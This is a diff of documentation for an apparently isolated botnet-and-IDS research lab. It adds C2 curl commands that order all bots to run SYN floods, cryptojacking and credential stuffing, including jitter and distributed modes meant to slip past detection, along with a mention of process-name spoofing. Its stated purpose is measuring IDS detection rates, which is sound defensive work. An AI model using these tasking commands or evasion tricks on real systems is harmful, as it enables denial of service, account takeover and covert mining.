@@ -415,24 +415,51 @@ curl -X POST http://192.168.100.10:5000/task \
      -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \
      -d '{"bot_id":"all","type":"syn_flood","target_ip":"192.168.100.20","target_port":80,"duration":15}'
 
-# Available task types via C2:
-#   "syn_flood"       — raw TCP SYN flood
-#   "udp_flood"       — raw UDP flood
-#   "slowloris"       — HTTP thread exhaustion
-#   "cryptojack"      — CPU burn simulation
-#   "cred_stuffing"   — spawns cred_stuffing.py
-#   "dga_search"      — spawns dga.py
-#   "idle"            — no-op
+# Available task types and their type-specific optional fields:
+#
+#   "syn_flood"     — raw TCP SYN flood
+#   "udp_flood"     — raw UDP flood
+#   "slowloris"     — HTTP thread exhaustion
+#   "cryptojack"    — CPU burn simulation
+#                     extra: "cpu" float 0-1 (default 0.25)
+#   "cred_stuffing" — credential stuffing via cred_stuffing.py
+#                     extra: "mode"    "bot"|"jitter"|"distributed" (default "jitter")
+#                            "jitter"  int ms std-dev              (default 200)
+#                            "workers" int threads (distributed)   (default 3)
+#   "dga_search"    — DGA NXDOMAIN burst via dga.py
+#   "idle"          — no-op
+#
+# All type-specific fields are forwarded verbatim through AES encryption
+# to the bot — whatever you put in the POST body arrives at the bot unchanged.
 
-# Note: tasks are automatically AES-128-CBC encrypted on delivery to bots
-# that registered with "enc":1. Legacy bots without encryption receive plaintext.
+# Cryptojack at 40% CPU for 60 s:
+curl -X POST http://192.168.100.10:5000/task \
+     -H "Content-Type: application/json" \
+     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \
+     -d '{"bot_id":"all","type":"cryptojack","duration":60,"cpu":0.40}'
+
+# Credential stuffing in jitter mode:
+curl -X POST http://192.168.100.10:5000/task \
+     -H "Content-Type: application/json" \
+     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \
+     -d '{"bot_id":"all","type":"cred_stuffing","target_ip":"192.168.100.20",
+          "target_port":80,"duration":120,"mode":"jitter","jitter":500}'
+
+# Credential stuffing in distributed mode:
+curl -X POST http://192.168.100.10:5000/task \
+     -H "Content-Type: application/json" \
+     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \
+     -d '{"bot_id":"all","type":"cred_stuffing","target_ip":"192.168.100.20",
+          "target_port":80,"duration":120,"mode":"distributed","workers":3}'
+
+# Note: tasks are AES-128-CBC encrypted on delivery to bots that registered
+# with "enc":1. Legacy bots without encryption receive plaintext.
 
 # View registered bots
 curl http://192.168.100.10:5000/bots
 
 # Receive a result from a bot (bots POST here after task completion)
-# Body: {"bot_id":"<id>", "result": <payload or encrypted payload>}
-curl http://192.168.100.10:5000/result   # GET to view; POST from bots
+curl http://192.168.100.10:5000/result
 
 # Debug endpoint: test AES round-trip on any JSON payload
 curl -X POST http://192.168.100.10:5000/encrypt_test \
@@ -651,6 +678,13 @@ sudo PYTHONPATH="/home/vboxuser/.local/lib/python3.12/site-packages" \
      python3 ids_detector.py
 ```
 
+**Alert log file:** `ids_detector.py` writes every alert to `/tmp/ids.log` on the victim VM (in addition to stdout). This file is read by `collect_graph23_data.py --graph3` to count `CREDENTIAL STUFFING` detections when measuring TPR/FPR for Graph 3.
+
+- When running via `run_full_lab.sh`, stdout is already redirected to `/tmp/ids.log` by the orchestrator — the file is written twice (once by the direct open, once by the redirect), but both writes are append-only so no data is lost.
+- When running **standalone** for Graph 3 data collection, the log file is created automatically — no manual redirect needed.
+- To tail alerts live: `tail -f /tmp/ids.log`
+- To count credential stuffing alerts fired so far: `grep -c "CREDENTIAL STUFFING" /tmp/ids.log`
+
 **Engine 1 — Volumetric** (SYN/UDP flood detection):
 - Alert triggers when SYN packets from one IP exceed **100/second** in a 1-second window
 - UDP alert triggers at **200 packets/second**
@@ -733,7 +767,7 @@ python3 tarpit_state.py unflag 192.168.100.11
 python3 tarpit_state.py clear
 ```
 
-**`fake_portal.py` tarpit REST endpoints** (admin/debug use):
+**`fake_portal.py` REST endpoints** (admin/debug use):
 
 ```bash
 # Flag an IP via HTTP (alternative to IDS file-based signalling)
@@ -748,6 +782,14 @@ curl -X POST http://192.168.100.20/tarpit/unflag \
 
 # Inspect tarpit state (flagged IPs, delay stats, total delayed count)
 curl http://192.168.100.20/tarpit/status | python3 -m json.tool
+
+# Reset the in-memory attempt log and tarpit stats between measurement windows.
+# Used by collect_graph23_data.py --graph3 before each jitter-level sweep.
+# Optional: "clear_tarpit":true also wipes /tmp/tarpit_state.json.
+curl -X POST http://192.168.100.20/attempts/reset \
+     -H "Content-Type: application/json" \
+     -d '{"clear_tarpit":true}'
+# Returns: {"status":"reset","cleared_tarpit":true}
 ```
 
 **Configuration** (edit `tarpit_state.py` constants to tune):
@@ -764,7 +806,8 @@ At the default 8s delay, a 1,000-credential attack that would complete in ~8 min
 ### 9.4 Cowrie Honeypot
 
 ```bash
-# Victim VM: full setup (creates dirs, installs cowrie.cfg, iptables redirect)
+# Victim VM: full setup (creates dirs, installs cowrie.cfg, iptables redirect,
+# generates SSH host keys, writes userdb with wildcard credentials)
 sudo python3 honeypot_setup.py --setup
 
 # Or start Cowrie manually after setup:
@@ -782,6 +825,8 @@ python3 honeypot_setup.py --report --out incident_report.md
 # Remove iptables rules when done:
 sudo python3 honeypot_setup.py --teardown
 ```
+
+**SSH host key generation:** `--setup` automatically generates `etc/ssh_host_rsa_key` and `etc/ssh_host_dsa_key` (required by `cowrie.cfg`). It tries `ssh-keygen` first, then falls back to the `cryptography` library, then `paramiko`. If all three fail it prints the exact manual commands to run. Keys are skipped if they already exist, so `--setup` is safe to re-run.
 
 Cowrie accepts **all credentials** (configured in `userdb.txt` with `*` wildcard) so every brute-force attempt logs in successfully and the scanner's post-login commands are captured.
 
@@ -865,24 +910,41 @@ If Cowrie is not running, the script falls back to manual entry: it prompts you 
 **How to collect real data** (run on the bot VM while portal + IDS are running on victim VM):
 
 ```bash
+# Victim VM: make sure these are running first
+sudo python3 ids_detector.py   # writes alerts to /tmp/ids.log
+sudo python3 fake_portal.py    # provides /login and /attempts/reset
+
 # Bot VM — automated 8-level jitter sweep:
 python3 collect_graph23_data.py --graph3 --host 192.168.100.20
 # Outputs: graph3_measured_data.json
 ```
 
-The script runs `cred_stuffing.py` at 8 jitter levels (0, 50, 100, 200, 350, 500, 750, 1000 ms) for 30 seconds each, then queries the IDS log at `/tmp/ids.log` to record whether a `CREDENTIAL STUFFING` alert was fired (TPR) and runs a human-baseline pass to measure false positives (FPR).
+The script runs `cred_stuffing.py` at 8 jitter levels (0, 50, 100, 200, 350, 500, 750, 1000 ms) for 30 seconds each. Between each level it calls `POST /attempts/reset` on the portal to clear the baseline, then checks `/tmp/ids.log` on the **victim VM** to count `CREDENTIAL STUFFING` alerts fired during that window (TPR). It then runs a human-baseline pass at the same jitter level to measure false positives (FPR).
+
+> **Important:** the IDS log is on the **victim VM** at `/tmp/ids.log`. The `--ids-log` flag lets you override this path if you have the log mounted or synced elsewhere:
+> ```bash
+> python3 collect_graph23_data.py --graph3 --host 192.168.100.20 \
+>     --ids-log /path/to/ids.log
+> ```
 
 > **Note:** single-run binary results are noisy at intermediate jitter levels. Run the sweep multiple times and average for smoother curves — the script prints a reminder at the end.
 
 Manual sweep (if you prefer to control each level):
 
 ```bash
+# On victim VM — start IDS (creates /tmp/ids.log automatically):
+sudo python3 ids_detector.py &
+
 for JITTER in 0 50 100 200 350 500 750 1000; do
+    # Reset portal baseline before each run
+    curl -s -X POST http://192.168.100.20/attempts/reset \
+         -H "Content-Type: application/json" -d '{"clear_tarpit":true}'
+    # Run bot traffic from bot VM for 30s
     python3 cred_stuffing.py --mode jitter --interval 500 --jitter $JITTER &
     sleep 30
     kill %1
-    # Check IDS log for alerts during this run
-    grep "CREDENTIAL STUFFING" /tmp/ids.log | tail -3
+    # Count alerts fired during this run
+    echo "Jitter ${JITTER}ms — alerts: $(grep -c 'CREDENTIAL STUFFING' /tmp/ids.log)"
 done
 ```
 
@@ -959,9 +1021,10 @@ Pre-session:
   [ ] No code on any device connected to the internet
 
 Post-session:
-  [ ] sudo ./run_full_lab.sh --clean   (kills all offensive processes)
-  [ ] sudo python3 firewall_dpi.py --teardown
-  [ ] sudo python3 honeypot_setup.py --teardown
+  [ ] sudo ./run_full_lab.sh --clean   (kills all offensive processes,
+                                        clears tarpit state, removes iptables rules)
+  [ ] python3 tarpit_state.py clear    (on victim VM — clears /tmp/tarpit_state.json
+                                        in case --clean was not used)
   [ ] cowrie stop                      (on victim VM)
   [ ] All VMs powered down
 ```
@@ -980,7 +1043,11 @@ Post-session:
 
 **P2P demo size:** Both `kademlia_p2p.c --demo` and `p2p_node.py --demo` run a **5-node** local mesh and kill 2 of them (40%) to demonstrate resilience. Earlier documentation referred to a "3-node demo" — that was the original design; the final implementation was upgraded to 5 nodes for a more convincing resilience test.
 
-**`cred_stuffing` command parity:** The `cred_stuffing` P2P command is now implemented in both `kademlia_p2p.c` (spawns `cred_stuffing.py` via `system()`) and `p2p_node.py` (inline `requests` loop). Both accept the same JSON fields: `target`, `port`, `mode` (`"bot"` / `"jitter"` / `"distributed"`), `duration`, `jitter`, `workers`.
+**`cred_stuffing` command parity:** The `cred_stuffing` P2P command is implemented in both `kademlia_p2p.c` (spawns `cred_stuffing.py` via `system()`) and `p2p_node.py` (inline loop with urllib). Both implementations accept the same six JSON fields — `target`, `port`, `duration`, `mode` (`"bot"` / `"jitter"` / `"distributed"`), `jitter`, `workers` — with identical defaults. The Phase 1 C2 server (`c2_server.py`) also forwards all these fields through the AES-encrypted task payload, so the operator's full parameterisation is preserved end-to-end.
+
+**IDS log file:** `ids_detector.py` writes every alert to `/tmp/ids.log` on the victim VM, in addition to stdout. The file is opened at startup so it exists before any attack begins. `collect_graph23_data.py --graph3` reads this file directly, meaning Graph 3 data collection works correctly whether the IDS is running standalone or via the orchestrator.
+
+**Portal reset endpoint:** `fake_portal.py` now exposes `POST /attempts/reset` which clears the in-memory attempt log, tarpit stats, and optionally tarpit flags. `collect_graph23_data.py --graph3` calls this between jitter levels to ensure a clean measurement baseline for each sweep.
 
 **Bot agent v3:** `bot_agent.c` dispatches all five payload types. SYN flood and UDP flood are implemented natively in C with raw sockets; Slowloris is a pure C implementation maintaining a 150-socket pool with dead-socket refill; cryptojacking uses a duty-cycle SHA-256 burn loop with `/proc/self/comm` name spoofing via `prctl(PR_SET_NAME)`; credential stuffing and DGA search spawn the Python modules via `system()`.
 
